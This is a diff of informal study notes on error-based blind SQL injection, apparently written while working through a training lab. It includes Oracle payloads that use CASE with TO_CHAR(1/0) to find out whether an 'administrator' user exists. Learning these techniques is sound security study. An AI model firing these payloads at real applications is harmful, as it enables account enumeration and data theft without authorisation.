@@ -70,8 +70,7 @@ The former expression contains a divide-by-zero, which causes an error. In this 
 Is there a simpler method to find users? This is good lessons but COME ON MAN!
 '||(SELECT 'a' FROM users WHERE username='administrator')||'; Would not work for username value as before the complex methdo is required. 
 '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' When user exist error, error when true statement before and after must be true for 1/0 to cause error
-'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator1')||' When user does not exist no error, When where doesn't evalaute is kind of like case 1=2, can
-t do
-
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator1')||' When user does not exist no error, When where doesn't evalaute is kind of like case 1=2, 
+Simples thought is two negatives make a positive. 
 
 
